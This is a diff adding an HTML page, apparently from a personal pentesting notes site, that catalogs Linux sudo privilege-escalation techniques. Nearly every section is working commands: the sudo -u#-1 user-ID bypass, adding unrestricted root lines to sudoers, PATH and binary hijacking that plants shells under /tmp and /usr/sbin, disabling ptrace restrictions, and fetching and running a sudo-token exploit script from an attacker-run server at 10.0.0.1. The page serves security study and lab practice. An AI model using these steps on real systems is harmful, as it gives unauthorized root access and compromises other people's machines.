@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Sudo privilege escalation - readloud.org</title>
+    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Sudo Privilege Escalation", url: "#_top", children: [
+          ]},
+          {title: "GTFOBins", url: "#gtfobins", children: [
+          ]},
+          {title: "Investigation", url: "#investigation", children: [
+              {title: "Version", url: "#version" },
+              {title: "As Another Users", url: "#as-another-users" },
+              {title: "List Privileges Commands", url: "#list-privileges-commands" },
+          ]},
+          {title: "Edit Sudoers", url: "#edit-sudoers", children: [
+          ]},
+          {title: "Command Forgery (NOPASSWD)", url: "#command-forgery-nopasswd", children: [
+          ]},
+          {title: "Command Forgery (SETENV, NOPASSWD)", url: "#command-forgery-setenv-nopasswd", children: [
+          ]},
+          {title: "Command Path Hijacking", url: "#command-path-hijacking", children: [
+          ]},
+          {title: "Shell in Prompt", url: "#shell-in-prompt", children: [
+          ]},
+          {title: "Reuse Sudo Tokens", url: "#reuse-sudo-tokens", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../js/base.js"></script>
+      <script src="../../../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h2 id="sudo-privilege-escalation">Sudo Privilege Escalation</h2>
+<p>Sudo commands might be vulnerable to privilege escalation (PrivEsc).</p>
+<h2 id="gtfobins">GTFOBins</h2>
+<p><a href="https://gtfobins.github.io/">GTFOBins</a> provides a wide variety of payloads to privilege escalation.<br />
+So it's recommended to look for in there.</p>
+<p><br /></p>
+<h2 id="investigation">Investigation</h2>
+<h3 id="version">Version</h3>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>--version
+</span></code></pre></div>
+<p>If the sudo <strong>version &lt;=1.28</strong>, try the following command.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo<span class="w"> </span>-u#-1<span class="w"> </span>/bin/bash
+</span></code></pre></div>
+<h3 id="as-another-users">As Another Users</h3>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>sudo<span class="w"> </span>su<span class="w"> </span>root
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>sudo<span class="w"> </span>-u<span class="w"> </span>john<span class="w"> </span>whoami
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="c1"># -s: run shell as target user</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>sudo<span class="w"> </span>-s
+</span></code></pre></div>
+<h3 id="list-privileges-commands">List Privileges Commands</h3>
+<p>We may be able to see the commands available as another user.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>sudo<span class="w"> </span>-l
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>sudo<span class="w"> </span>-ll
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="c1"># Specify hostname</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>sudo<span class="w"> </span>-h<span class="w"> </span>&lt;host-name&gt;<span class="w"> </span>-l
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="c1"># Execute via the hostname</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>sudo<span class="w"> </span>-h<span class="w"> </span>&lt;host-name&gt;<span class="w"> </span>/bin/bash
+</span></code></pre></div>
+<p>Also we might see from following files.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>cat<span class="w"> </span>/etc/sudoers
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>cat<span class="w"> </span>/etc/sudoers.d/usersgroup
+</span></code></pre></div>
+<p>If we find the following result for sudoers,</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="o">(</span>ALL,<span class="w"> </span>!root<span class="o">)</span><span class="w"> </span>NOPASSWD:<span class="w"> </span>/bin/bash
+</span></code></pre></div>
+<p>We might be able to get a root shell as follow.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>sudo<span class="w"> </span>-u#-1<span class="w"> </span>/bin/bash
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="edit-sudoers">Edit Sudoers</h2>
+<p>If we have permission to write <code>/etc/sudoers</code>, we can modify this file.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>sudo<span class="w"> </span>visudo<span class="w"> </span>-f<span class="w"> </span>/etc/sudoers
+</span></code></pre></div>
+<p>Now add the following line to allow us to execute all commands as root.<br />
+Assume we logged in as <code>john</code>.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># Unrestriction</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>john<span class="w"> </span><span class="nv">ALL</span><span class="o">=(</span>ALL:ALL<span class="o">)</span><span class="w"> </span>ALL
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="c1"># or</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>john<span class="w"> </span><span class="nv">ALL</span><span class="o">=(</span>root<span class="o">)</span><span class="w"> </span>NOPASSWD:<span class="w"> </span>ALL
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="c1"># Specific command as root</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>john<span class="w"> </span><span class="nv">ALL</span><span class="o">=(</span>root<span class="o">)</span><span class="w"> </span>NOPASSWD:<span class="w"> </span>/usr/bin/passwd
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="command-forgery-nopasswd">Command Forgery (NOPASSWD)</h2>
+<p>If you are allowed to execute some command, you can forge the contents of the command.<br />
+First off, check the properties.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>sudo<span class="w"> </span>-l
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="o">(</span>root<span class="o">)</span><span class="w"> </span>NOPASSWD:<span class="w"> </span>somecmd
+</span></code></pre></div>
+<p>If you can confirm that it can be executed as root without password, create the same named command in the arbitrary folder in which you can write files.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># option 1</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="nb">echo</span><span class="w"> </span>/bin/sh<span class="w"> </span>&gt;<span class="w"> </span>/tmp/somecmd
+</span></code></pre></div>
+<p>Next, change the permission for allowing to execute it.<br />
+And add the path to the environment.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/somecmd
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+</span></code></pre></div>
+<p>Now execute the command as root.  </p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>sudo<span class="w"> </span>somecmd
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>whoami
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="c1"># root</span>
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="command-forgery-setenv-nopasswd">Command Forgery (SETENV, NOPASSWD)</h2>
+<p>If you found there is a <strong>SETENV:</strong> in sudoers, you can set the <strong>PATH</strong> when running the command.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>sudo<span class="w"> </span>-l
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="o">(</span>root<span class="o">)</span><span class="w"> </span>SETENV:<span class="w"> </span>NOPASSWD:<span class="w"> </span>somecmd
+</span></code></pre></div>
+<p>As the previous section, prepare the payload.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;/bin/bash -p&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/somecmd
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/somecmd
+</span></code></pre></div>
+<p>Now run the command as root with setting the PATH.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>sudo<span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span><span class="w"> </span>somecmd
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>whoami
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="command-path-hijacking">Command Path Hijacking</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>sudo<span class="w"> </span>-l
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>env_reset
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="o">(</span>root<span class="o">)</span><span class="w"> </span>python<span class="w"> </span>/home/user/example.py
+</span></code></pre></div>
+<p>If we can execute some command as root but <strong><code>env_reset</code></strong> and <strong><code>secure_path</code></strong> are set, we cannot override the <strong>PATH</strong> environment variable.<br />
+Instead we need to check if we have permission to write each path.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>ls<span class="w"> </span>-al<span class="w"> </span>/usr/local/
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>ls<span class="w"> </span>-al<span class="w"> </span>/usr/
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>ls<span class="w"> </span>-al<span class="w"> </span>/
+</span></code></pre></div>
+<p>Assume we can write an arbitrary binary file under <strong><code>/usr/sbin</code></strong>, we can create a payload in there.<br />
+For example, we create a <strong><code>python</code></strong> binary under <strong><code>/usr/sbin</code></strong>.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="nb">echo</span><span class="w"> </span>/bin/bash<span class="w"> </span>&gt;<span class="w"> </span>/usr/sbin/python
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>chmod<span class="w"> </span>+x<span class="w"> </span>/usr/sbin/python
+</span></code></pre></div>
+<p>Then execute the sudo command.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>sudo<span class="w"> </span>python<span class="w"> </span>/home/user/example.py
+</span></code></pre></div>
+<p>Now we should get a root shell.</p>
+<p><br /></p>
+<h2 id="shell-in-prompt">Shell in Prompt</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="ch">#!/bin/bash</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="nb">read</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;What&#39;s you name: &quot;</span>
+</span></code></pre></div>
+<p>If we found there is another user’s script which can be executed as root, you can input <strong>`/bin/bash -i`</strong> to get a shell as another user.</p>
+<p><br /></p>
+<h2 id="reuse-sudo-tokens">Reuse Sudo Tokens</h2>
+<p>Reference: <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens">https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens</a></p>
+<p>If the current user executes some command using sudo, we might be able to escalate to root privilege.
+Check if no restriction on ptrace.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>cat<span class="w"> </span>/proc/sys/kernel/yama/ptrace_scope
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="m">0</span>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="c1"># We can temporariliy set 0 if we have permissions.</span>
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="nb">echo</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>/proc/sys/kernel/yama/ptrace_scope
+</span></code></pre></div>
+<p>If the target system does not have <strong><code>gdb</code></strong> binary, we can download it.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="c1"># In local machine, download the debian package.</span>
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>wget<span class="w"> </span>http://fi.archive.ubuntu.com/ubuntu/pool/main/g/gdb/gdb_9.1-0ubuntu1_amd64.deb<span class="w"> </span>-O<span class="w"> </span>gdb.deb
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="c1"># In remote machine, download the deb package and extract it.</span>
+</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>wget<span class="w"> </span>http://10.0.0.1:8000/gdb.deb
+</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a>dpkg<span class="w"> </span>-x<span class="w"> </span>gdb.deb<span class="w"> </span>~
+</span></code></pre></div>
+<p>Next, prepare the exploit script from <a href="https://github.com/nongiach/sudo_inject">the repo</a> and execute it.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="c1"># In local machine, download the shell script to exploit.</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>wget<span class="w"> </span>https://github.com/nongiach/sudo_inject/blob/master/exploit.sh
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="c1"># In remote machine, download it and execute.</span>
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>wget<span class="w"> </span>http://10.0.0.1:8000/exploit.sh
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>sh<span class="w"> </span>exploit.sh
+</span></code></pre></div>
+<p>After that, we can spawn the root shell.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>/tmp/activate_sudo_token
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>sudo<span class="w"> </span>su
+</span></code></pre></div>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/os/linux/privilege-escalation/sudo/sudo-privilege-escalation.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
